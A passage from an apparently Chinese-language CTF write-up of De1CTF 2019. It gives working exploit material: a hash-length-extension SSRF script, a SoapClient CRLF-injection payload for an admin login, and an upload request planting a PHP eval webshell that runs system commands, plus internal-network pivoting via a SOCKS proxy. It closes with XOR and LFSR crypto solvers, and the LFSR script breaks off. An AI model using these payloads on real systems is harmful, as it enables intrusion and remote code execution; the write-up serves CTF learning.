class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>很明显是 ssrf 读文件+哈希长度扩展攻击，这里过滤了 file 协议，出题人本想考CVE-2019-9948 ，使用local_file协议读取文件，但是urlopen直接可以读文件，导致了非预期。。。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">param = <span class="string">'local_file:flag.txt'</span></span><br><span class="line"><span class="comment">#param = "flag.txt"也可以</span></span><br><span class="line">hash_value = requests.get(<span class="string">"http://139.180.128.86/geneSign"</span>,params=&#123;<span class="string">'param'</span>:param&#125;).text</span><br><span class="line">new_hash_value,payload = hashpumpy.hashpump(hash_value,param+<span class="string">"scan"</span>,<span class="string">"read"</span>,<span class="number">16</span>)</span><br><span class="line">payload = quote(payload[len(param):])</span><br><span class="line">a = requests.get(<span class="string">"http://139.180.128.86/De1ta"</span>,params=&#123;<span class="string">'param'</span>:param&#125;,cookies=&#123;<span class="string">'sign'</span>:new_hash_value,<span class="string">'action'</span>:payload&#125;)</span><br><span class="line"><span class="keyword">print</span> a.text</span><br></pre></td></tr></table></figure><h3 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h3><p>这题把两个题强行拼到一起，加到内网里…</p><p>开始和2018 n1ctf Easy&amp;&amp;Hard Php 几乎一样，具体参考<a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148 </a>，直接打就完事了。</p><p>源码泄露拿到源码。</p><p>开始不知道是原题改的，审代码，审了很久发现 publish的signature 处有注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 signature 可控，我们可以注入。</p><p>注出管理员密码，md5反解是jaivypassword，登录发现限制了登录ip，卡住。</p><p>我的思路一直是 insert 语句中执行 update，把数据库中用户的 is_admin 给改掉，试了一万年也不行。。。（好像是做不到的）</p><p>直到看到是原题，照着上面的wp开始打。。。</p><p>浏览器先打开登录页面，得到PHPSESSID是f1vr5f8189lm6oqqtodqkvp7r6，md5是070a7 ，爆破一下验证码是915720，然后生成payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=915720'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=f1vr5f8189lm6oqqtodqkvp7r6'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3230313a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d663176723566383138396c6d366f7171746f64716b76703772360d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d393135373230223b733a31333a225f736f61705f76657273696f6e223b693a313b7d</span><br></pre></td></tr></table></figure><p>然后在签名处：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-77f7c3c693072c6a.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7a28c7deda6af8d7.png" alt="image.png"></p><p>刷新一下PHPSESSID是f1vr5f8189lm6oqqtodqkvp7r6的浏览器页面，就是admin了。</p><p>进入admin，写个马，然后访问/upload/gml.php，就可以得到webshell，然后提示说flag在内网机器里。。。</p><p>ifconfig发现机器ip是172.18.0.3，扫一下发现内网 172.18.0.2 在 80端口开着一个web服务：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a4f6261550a14813.png" alt="image.png"></p><p>又是一道原题，去年上海市大学生网络安全竞赛的题。。。参考<a href="https://blog.cindemor.com/post/ctf-web-12.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-web-12.html</a></p><p>搭个代理，使用reGeorgSocksProxy，<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>burp配个二重代理：</p><p>构造了这个能写马数据包：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 172.18.0.2</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Length</span>: 650</span><br><span class="line"></span><br><span class="line">-----------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="shell.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">@&lt;?php  echo 1;@eval($_POST['gml']);?&gt;</span><br><span class="line">-----------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file[1]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file[0]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">php/.</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="hello"</span><br><span class="line"></span><br><span class="line"><span class="attribute">php/../shell.php</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="gml"</span><br><span class="line"></span><br><span class="line">system("ls /");</span><br><span class="line">-----------------------------444980421912--</span><br></pre></td></tr></table></figure><p>发包：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a1c3ec218aa3a292.png" alt="image.png"></p><p>爆破文件名：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-29c513374b291b2f.png" alt="image.png"></p><p>题目中说flag含有flag关键字，直接查找：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cd2bb3c423d49a43.png" alt="image.png"></p><p>getflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xorz"><a href="#xorz" class="headerlink" title="xorz"></a>xorz</h3><p>去年 HCTF 出过类似的，key循环使用异或很长的明文，这道题还异或了个salt，不过salt已知，异或回去就好了。</p><p>偷一波天枢HCTF当时的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(b1, b2)</span>:</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span><span class="params">(text)</span>:</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space = <span class="number">0</span></span><br><span class="line">    max_possible = <span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible &gt; max_possible:</span><br><span class="line">            max_possible = maxpossible</span><br><span class="line">            possible_space = a</span><br><span class="line">    key = text[possible_space] ^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = libnum.n2s(int(<span class="string">"1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79"</span>,<span class="number">16</span>))</span><br><span class="line">b = bytes(b, encoding = <span class="string">"utf8"</span>)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE, _ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">"utf-8"</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">"keysize:"</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">"key is:"</span>, keys, <span class="string">"n"</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><blockquote><p>de1ctf{W3lc0m3tOjo1nu55un1ojOt3m0cl3W}</p></blockquote><h3 id="babylfsr"><a href="#babylfsr" class="headerlink" title="babylfsr"></a>babylfsr</h3><p>给了生成的比特流，没给mask，256 bit，无爆破可能。</p><p>参考： <a href="https://blog.csdn.net/kevin66654/article/details/80554932" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/80554932</a> </p><p>思路是根据生成的比特流，构造矩阵乘法来还原mask，相当于 M * mask = C，其中M是256*256的矩阵，mask和C是256*1的列向量（方程中中所有的元素不是0就是1，加法相当于异或），高斯消元去掉 M ，得到mask。</p><p>但是这里面我们只有508个比特，还需要8个bit才能解出mask，这里我们需要爆破8个bit，每种情况求出的mask都去还原一下key，因为题目给了key sha256的前四位，所以可以去比对，前四位对上的就是flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">data = open(<span class="string">"output"</span>, <span class="string">"r"</span>).read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span><span class="params">(stream)</span>:</span></span><br><span class="line">    dim = <span class="number">256</span></span><br><span class="line">    magic = [map(int, list(stream[i:i + <span class="number">256</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">    cipher = map(int, list(stream[<span class="number">256</span>:]))</span><br><span class="line">    <span class="keyword">assert</span> len(cipher) == <span class="number">256</span></span><br><span class="line">    <span class="comment">#高斯消元</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> 